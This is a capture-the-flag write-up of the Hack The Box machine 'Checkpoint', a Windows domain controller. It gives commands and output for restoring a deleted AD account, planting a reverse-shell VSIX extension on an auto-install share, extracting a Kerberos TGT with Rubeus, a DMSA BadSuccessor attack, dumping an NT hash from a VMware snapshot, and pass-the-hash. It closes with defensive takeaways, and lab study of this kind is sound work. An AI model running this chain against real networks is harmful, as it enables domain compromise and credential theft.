# HTB Write-Up: Checkpoint

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Checkpoint)   |
| Difficulty | Hard                                                             |
| OS         | Windows                                                          |
| Author     | Landau                                                           |
| Date       | June 16, 2026                                                    |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Shares & Deleted Object Recovery](#2-enumeration--smb-shares--deleted-object-recovery)
3. [Initial Access — Malicious VSIX Extension via DevDrop](#3-initial-access--malicious-vsix-extension-via-devdrop)
4. [Lateral Movement — TGT Delegation & DMSA BadSuccessor Attack](#4-lateral-movement--tgt-delegation--dmsa-badsuccessor-attack)
5. [Privilege Escalation — VMware Snapshot Memory Forensics](#5-privilege-escalation--vmware-snapshot-memory-forensics)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery:

```bash
rustscan -a 10.129.15.140 --ulimit 5000
```

**Open Ports:**

| Port  | Service    | Details                              |
|-------|------------|--------------------------------------|
| 53    | DNS        | Microsoft DNS                        |
| 88    | Kerberos   | Microsoft Windows Kerberos           |
| 135   | MSRPC      | Microsoft Windows RPC                |
| 139   | NetBIOS    | Microsoft Windows netbios-ssn        |
| 389   | LDAP       | Domain: `checkpoint.htb`             |
| 445   | SMB        | microsoft-ds                         |
| 464   | kpasswd5   | tcpwrapped                           |
| 593   | HTTP-RPC   | RPC over HTTP                        |
| 636   | LDAPSSL    | tcpwrapped                           |
| 5985  | WinRM      | Windows Remote Management            |

The host is a **Domain Controller** running **Windows Server 2025** (Build 26100), hostname **DC01**, domain: **`checkpoint.htb`**. No HTTP server is exposed — this is a pure AD machine.

The machine was provided with starting credentials: **`alex.turner:Checkpoint2024!`**

---

## 2. Enumeration — SMB Shares & Deleted Object Recovery

### 2.1 — Domain User Enumeration via SMB

All domain accounts were pulled via NetExec:

```bash
netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
```

**Users discovered:**

```
Administrator, Guest, krbtgt
alex.turner, ryan.brooks, svc_deploy, james.harper, sarah.mitchell,
emily.carter, david.reynolds, jessica.coleman, lauren.flores,
michael.torres, kevin.patterson, brian.jenkins, megan.perry, max.palmer
```

### 2.2 — SMB Share Enumeration

```bash
netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
```

**Output:**

```
SMB  10.129.15.140  445  DC01  Share       Permissions  Remark
SMB  10.129.15.140  445  DC01  -----       -----------  ------
SMB  10.129.15.140  445  DC01  ADMIN$                   Remote Admin
SMB  10.129.15.140  445  DC01  C$                       Default share
SMB  10.129.15.140  445  DC01  DevDrop     READ         VS Code extensions share for approved .vsix packages
SMB  10.129.15.140  445  DC01  IPC$        READ         Remote IPC
SMB  10.129.15.140  445  DC01  NETLOGON    READ         Logon server share
SMB  10.129.15.140  445  DC01  SYSVOL      READ         Logon server share
SMB  10.129.15.140  445  DC01  VMBackups                
```

Two non-standard shares stand out — **`DevDrop`** (a VS Code extension distribution share) and **`VMBackups`** (no permissions yet). AS-REP Roasting and Kerberoasting returned nothing for any users.

### 2.3 — Writable Object Discovery & Deleted Account Recovery

**bloodyAD** was used to enumerate objects `alex.turner` has write access to:

```bash
bloodyAD --host 10.129.15.140 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

**Key findings:**

```
distinguishedName: CN=Mark Davies\0ADEL:2217e877-...,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

A **deleted account** named `mark.davies` was discovered in the Deleted Objects container — and `alex.turner` has WRITE permission over it, meaning it can be restored.

The account was restored with a single command:

```bash
bloodyAD --host 10.129.15.140 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
```

```
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

### 2.4 — Elevated Share Access as mark.davies

Share enumeration as the restored account revealed significantly elevated permissions:

```bash
netexec smb 10.129.15.140 -u mark.davies -p 'Checkpoint2024!' --shares
```

**Output (key difference):**

```
SMB  10.129.15.140  445  DC01  DevDrop  READ,WRITE  VS Code extensions share...
```

`mark.davies` has **READ + WRITE** access to `DevDrop` — the VS Code extension distribution share. This is the attack surface.

---

## 3. Initial Access — Malicious VSIX Extension via DevDrop

### 3.1 — Understanding the Attack Surface

The `DevDrop` share description states it holds "approved `.vsix` packages compatible with VS Code engine 1.118.0." This implies a scheduled task or automated process on the DC periodically installs extensions from this share — likely running as a domain user (`ryan.brooks`, based on later findings). Uploading a malicious `.vsix` file would trigger code execution when the extension is installed.

### 3.2 — Building the Malicious VSIX Extension

A minimal VS Code extension project was scaffolded and a reverse shell payload was embedded in `extension.js`:

```bash
mkdir evil-ext && cd evil-ext
npm init -y
npm install --save-dev @vscode/vsce
```

The `extension.js` was written to execute a reverse shell on activation, and `package.json` was configured with the required VS Code extension metadata fields (`publisher`, `engines.vscode`, `activationEvents: ["*"]`).

The `.vsix` package was built:

```bash
npx vsce package --allow-missing-repository
```

```
DONE  Packaged: evil-ext-0.0.1.vsix (4 files, 1.79 KB)
```

### 3.3 — Uploading to DevDrop & Catching the Shell

The `.vsix` was uploaded to the `DevDrop` share as `mark.davies`:

```bash
smbclient //10.129.15.140/DevDrop -U 'mark.davies%Checkpoint2024!'
smb: \> put evil-ext-0.0.1.vsix
```

A netcat listener was started, and after the scheduled `VSCodeExtSync` task fired, a reverse shell connected:

```bash
rlwrap nc -nvlp 9001
```

```
connect to [10.10.14.222] from (UNKNOWN) [10.129.15.140] 50560
PS C:\Program Files\Microsoft VS Code>
```

Shell obtained as **`ryan.brooks`** on `DC01`.

---

## 4. Lateral Movement — TGT Delegation & DMSA BadSuccessor Attack

### 4.1 — TGT Extraction via Rubeus tgtdeleg

From the `ryan.brooks` shell, **Rubeus** was used to extract a delegatable TGT for the current user without requiring plaintext credentials:

```bash
.\Rubeus.exe tgtdeleg /nowrap
```

**Output (excerpt):**

```
[*] Action: Request Fake Delegation TGT (current user)
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success!
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaED...
```

The base64 ticket was decoded and converted to ccache format for use with impacket tools:

```bash
echo 'doIF1DCCBd...' | base64 -d > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
```

```
[*] converting kirbi to ccache...
[+] done
```

### 4.2 — DMSA BadSuccessor Attack via bloodyAD

With `ryan.brooks`'s TGT in hand, **BloodHound** revealed that `ryan.brooks` has the necessary rights to perform a **DMSA (Delegated Managed Service Account) BadSuccessor** attack against `svc_deploy`.

The BadSuccessor technique abuses the `msDS-SupersededServiceAccountDN` attribute to create a new DMSA that inherits `svc_deploy`'s keys and effectively impersonates it:

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u ryan.brooks -k ccache=ryan.ccache \
  add badSuccessor evil-dmsa \
  -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

**Output:**

```
[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB

Realm      : CHECKPOINT.HTB
UserName   : evil-dmsa$
KeyType    : 18

dMSA current keys found in TGS:
AES256: e3d23b60dc81697f73e61bcee444f3986e80d5d95c97035672a254186876869d
AES128: c194b9e2b92badff8bad86808971eae0
RC4:    bcffd068cde6897fbe298d739cd17ef3

dMSA previous keys (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9

[+] dMSA TGT stored in ccache file evil-dmsa_RP.ccache
```

The attack successfully extracted `svc_deploy`'s NTLM (RC4) hash: **`bcffd068cde6897fbe298d739cd17ef3`**

---

## 5. Privilege Escalation — VMware Snapshot Memory Forensics

### 5.1 — VMBackups Share & Memory Snapshot Discovery

With `svc_deploy`'s hash, access to the previously inaccessible `VMBackups` share was gained. The share contained a full VMware VM backup with a memory snapshot:

```powershell
*Evil-WinRM* PS C:\temp> ls "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics"
```

```
Windows Server 2019-000001.vmdk           106,496,000
Windows Server 2019-Snapshot1.vmem      2,147,483,648
Windows Server 2019-Snapshot1.vmsn        138,164,859
Windows Server 2019.vmdk              10,199,695,360
Windows Server 2019.vmx
```

The `.vmsn` file (VMware snapshot state) contains a memory image of a running Windows Server 2019 machine — credential-rich by nature.

### 5.2 — Credential Extraction with vmkatz

**vmkatz** was used to extract credentials directly from the VMware snapshot memory file, similar to how Mimikatz operates on live LSASS — but against an offline memory image:

```powershell
.\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn"
```

**Output (excerpt):**

```
[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) DPAPI(ok)
[*] 2 sessions, 1 NT hashes, 0 plaintext passwords

LUID: 0x14016d
Username:    Administrator
Domain:      WIN-0DG6SJAEUTA
LogonTime:   2026-05-09 14:07:14 UTC

[MSV1_0]
  NT Hash : f29e9c014295b9b32139b09a2790be3b
```

The **local Administrator NT hash** was extracted from the snapshot: `f29e9c014295b9b32139b09a2790be3b`

### 5.3 — Root Flag via Pass-the-Hash

With the Administrator NT hash, a shell was opened on the DC via Evil-WinRM using Pass-the-Hash:

```bash
evil-winrm -i 10.129.16.20 -u administrator -H f29e9c014295b9b32139b09a2790be3b
```

**Root flag retrieved from `\Users\max.palmer\Desktop\root.txt`:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\downloads> type C:\Users\max.palmer\Desktop\root.txt
22bac485827536dbeb24bab6bf9b3285
```

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan | DC01 identified, Windows Server 2025; `DevDrop` and `VMBackups` shares noted |
| Enumeration | NetExec `--users` / `--shares` | 14 domain users; `DevDrop` readable, `VMBackups` inaccessible |
| Object Discovery | bloodyAD `get writable` | Deleted account `mark.davies` found with WRITE permission for `alex.turner` |
| Account Restore | bloodyAD `set restore` | `mark.davies` restored to `OU=Employees`; gains READ/WRITE on `DevDrop` |
| Malicious VSIX | Custom extension + `vsce package` | `.vsix` reverse shell uploaded to `DevDrop`; shell as `ryan.brooks` via scheduled task |
| TGT Extraction | Rubeus `tgtdeleg` | Delegatable TGT for `ryan.brooks` extracted without plaintext credentials |
| DMSA BadSuccessor | bloodyAD `add badSuccessor` | `evil-dmsa$` created superseding `svc_deploy`; RC4 hash of `svc_deploy` recovered |
| VMware Forensics | `vmkatz` on `.vmsn` snapshot | Local Administrator NT hash extracted from offline memory image |
| Root | Evil-WinRM + Pass-the-Hash | `root.txt` from `\Users\max.palmer\Desktop` |

### Key Takeaways

- **Deleted AD objects retain their permissions and can be weaponized.** `alex.turner` had WRITE access over `mark.davies` even in the Deleted Objects container. Restoring the account reclaimed write access to `DevDrop`. Deleted objects should be purged and their ACL delegations cleaned up — not just soft-deleted.

- **Automated VS Code extension deployment is a code execution primitive.** Any writable extension distribution share where an automated process installs `.vsix` files is effectively a remote code execution vector. Extension installation pipelines must validate package signatures and restrict write access exclusively to CI/CD service accounts.

- **Rubeus `tgtdeleg` bypasses the need for plaintext credentials.** By requesting a fake delegation TGT via the Kerberos GSS-API, an attacker with a shell can extract a usable TGT for the current user without knowing their password — enabling Kerberos-based lateral movement from any shell.

- **DMSA BadSuccessor (CVE-2025-26708) is a critical AD privilege escalation path.** Any principal with sufficient rights to create a DMSA and set `msDS-SupersededServiceAccountDN` can inherit the keys of any targeted managed service account. Privileged DMSA creation rights must be tightly restricted, and DMSA usage should be audited continuously.

- **VMware memory snapshots are credential stores.** A `.vmsn` or `.vmem` file from a running Windows machine contains a copy of LSASS memory, making it equivalent to a live credential dump. VM backup shares must be treated as highly sensitive — equal in sensitivity to a DC itself — and access must be restricted to backup service accounts only.

- **Backup infrastructure is a high-value lateral movement target.** The `VMBackups` share ultimately provided a path to Administrator. Backup systems routinely hold the most sensitive data on a network and are frequently under-secured. They should be isolated, access-logged, and subject to the same hardening standards as the systems they back up.
